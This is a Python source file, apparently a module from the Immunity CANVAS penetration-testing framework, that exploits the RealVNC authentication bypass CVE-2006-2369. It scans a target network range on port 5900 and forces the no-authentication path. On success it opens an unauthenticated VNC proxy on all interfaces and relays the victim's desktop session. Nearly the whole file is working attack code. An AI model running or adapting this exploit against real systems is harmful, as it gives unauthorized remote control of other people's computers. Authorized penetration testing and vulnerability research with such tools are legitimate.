#! /usr/bin/env python

"""
Find Non-Authenticated VNC servers
"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2004
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

import sys
if "." not in sys.path:
    sys.path.append(".")

import socket
from exploitutils import *
from tcpexploit import tcpexploit
from libs import rfb

NAME="REALVNC_NOAUTH"
DESCRIPTION="Detect buggy authentication in RealVNC Servers"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="RealVNC"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2006-2369"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2369"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
# non platform specic should probably be it's own category
PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["Mac OS X"], ["HP-UX"] ]

CHANGELOG="""

"""
NOTES="""
"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.lenchunk=0
        self.setPort(5900)
        self.setHost("")
        self.setVersion(1)
        self.badstring=""
        self.istest=0
        self.netmask = "32"
        self.name=NAME
        return

    def run_on_host(self, target):
        self.log("Attempting to authenticate to %s"%target.interface)
        try:
            r=rfb.RFB_Client(target.interface, self.port, version = "003.008")
        except socket.error, msg:
            self.log("1) %s" % str(msg))
            return 0
        except timeoutsocket.Timeout, msg:
            self.log("Timeout: %s" % str(msg))
            return 0

        try:
                auth=r.force_realvnc_auth()
        except:
                auth = 1

        if not auth:
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            proxyport = 5900
            self.log("Setting a VNC Proxy on port: %d" % proxyport)
            server = rfb.RFB_Server("0.0.0.0", port = proxyport, version="003.003")
            server.send_auth_type(1) # NO AUTH
            sockets= [r.getsock(), server.getsock()]

            import select
            while 1:
                r,w,e = select.select( sockets, [], [], 0)
                for sucket in r:
                    try:
                            ndx = sockets.index(sucket)
                            buf = sockets[ndx].recv(4096)
                            if not buf:
                                    sockets[ndx-1].close()
                                    return 1
                            sockets[ndx-1].send(buf)
                    except ValueError:
                            continue

        else:
            self.setInfo("%s attacking %s:%d (failed!)"%(self.name,self.host,self.port), showlog=True)

        return not auth

    def getargs(self):
        self.host=self.target.interface
        self.netmask=self.argsDict.get("netmask",self.netmask).replace("/","")

    def run(self):
        """
        Actually exploit the target.
        """
        self.getargs()
        self.setInfo("Scanning %s"%(self.host), showlog=True)
        self.log("Interface=%s"%self.host)
        self.log("Netmask=%s"%self.netmask)

        self.run_on_all_possible_hosts()

    def test(self):
        "just connects to the host - ignores netmask argument"
        self.getargs()
        node=self.argsDict["passednodes"][0]
        target=node.get_known_host(self.host)
        if not target:
            target=node.new_host(self.host,add=0) #don't add the host by default

        try:
            r=rfb.RFB_Client(target.interface, self.port, version = "003.008")
        except socket.error, msg:
            self.log("1) %s" % str(msg))
            return 0
        except timeoutsocket.Timeout, msg:
            self.log("Timeout: %s" % str(msg))
            return 0

        try:
                auth=r.force_realvnc_auth()
        except:
                auth = 1
        r.close()
        return not auth

    def usage(self):
        app = theexploit()
        print "Usage: "+sys.argv[0]+" [-T] [-v version]  -t target [ -p targetport:%d]"%(app.port)


if __name__ == '__main__':
    print "Running CANVAS "+NAME+" version "+VERSION
    app = theexploit()
    ret=standard_callback_commandline(app)

